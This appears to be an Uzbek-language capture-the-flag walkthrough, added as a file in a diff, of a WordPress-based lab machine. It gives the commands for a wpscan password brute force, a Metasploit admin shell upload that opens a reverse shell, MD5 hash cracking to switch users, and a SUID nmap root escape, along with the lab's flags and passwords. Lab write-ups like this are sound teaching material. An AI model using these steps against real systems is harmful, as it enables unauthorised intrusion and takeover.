@@ -1,0 +1,70 @@
+1. Bosqich: Razvedka va Parolni aniqlash (Brute Force)
+Hujumning boshida bizga faqat IP manzil ma'lum edi. robots.txt faylidan bizga kerakli lug'at (fsocity.dic) va foydalanuvchi nomi (elliot) haqida ishoralar topildi.
+
+Buyruq:
+
+Bash
+wpscan --url http://192.168.56.122/wp-login.php -U 'elliot' -P fsocity_filterd.dic
+Vazifasi: WordPress saytidagi elliot foydalanuvchisi uchun lug'at asosida parol qidirish.
+
+Natija: Parol aniqlandi: ER28-0652.
+
+2. Bosqich: Metasploit orqali Kirish (Exploitation)
+Foydalanuvchi ma'lumotlari bo'lgani uchun biz WordPress-ga "Shell" (buyruqlar paneli) yuklash imkoniyatiga ega bo'ldik.
+
+Buyruqlar ketma-ketligi:
+
+msfconsole — Metasploit dasturini ishga tushirish.
+
+use exploit/unix/webapp/wp_admin_shell_upload — Kerakli exploit modulini tanlash.
+
+set RHOSTS 192.168.56.122 — Nishon (target) IP-ni ko'rsatish.
+
+set USERNAME elliot — Foydalanuvchi nomini kiritish.
+
+set PASSWORD ER28-0652 — Topilgan parolni kiritish.
+
+set LHOST 192.168.56.103 — Sizning Kali Linux IP-ingiz (Reverse shell qaytib kelishi uchun).
+
+set wpcheck false — WordPress versiyasini tekshirmasdan to'g'ridan-to'g'ri hujum qilish.
+
+run — Hujumni boshlash.
+
+Natija: Meterpreter session 1 opened. Biz tizimga daemon foydalanuvchisi sifatida kirdik.
+
+3. Bosqich: Shellni barqarorlashtirish (Post-Exploitation)
+Kirganimizdan so'ng, terminal bizga to'liq imkoniyatlarni bermayotgan edi, shuning uchun uni Python orqali tuzatib oldik.
+
+Buyruqlar:
+
+shell — Meterpreter ichidan Linux terminaliga o'tish.
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+Vazifasi: Standart, rangli va buyruqlarni to'liq bajaradigan terminalga (TTY) ega bo'lish.
+
+4. Bosqich: Gorizontal huquqni oshirish (User Pivoting)
+Tizimda /home/robot papkasi borligini va unda key-2-of-3.txt borligini ko'rdik, lekin uni o'qish uchun robot foydalanuvchisi bo'lish kerak edi.
+
+Buyruq: cat /home/robot/password.raw-md5
+
+Natija: robot:c3fcd3d76192e4007dfb496cca67e13b
+
+Keyingi qadam: Ushbu MD5 hashini onlayn de-shifrlash natijasida parol topildi: abcdefghijklmnopqrstuvwxyz.
+
+Buyruq: su robot (So'ngra parolni kiritish).
+
+Vazifasi: daemon foydalanuvchisidan robot foydalanuvchisiga o'tish. Shundan so'ng 2-bayroqni o'qidingiz.
+
+5. Bosqich: Root huquqini olish (Privilege Escalation)
+Eng oxirgi maqsad — butun tizim boshqaruvini qo'lga olish va /root papkasidagi oxirgi bayroqni o'qish edi.
+
+Tekshiruv: Tizimda SUID huquqiga ega fayllarni qidirganda Nmap (3.81 versiyasi) topildi.
+
+Buyruq: nmap --interactive
+
+Vazifasi: Nmap-ni interaktiv rejimda ochish. Bu rejimda buyruqlar root (admin) huquqi bilan bajariladi.
+
+Buyruq: !cat /root/key-3-of-3.txt
+
+Natija: Oxirgi bayroq o'qildi: 04787ddef27c3dee1ee161b21670b4e4.
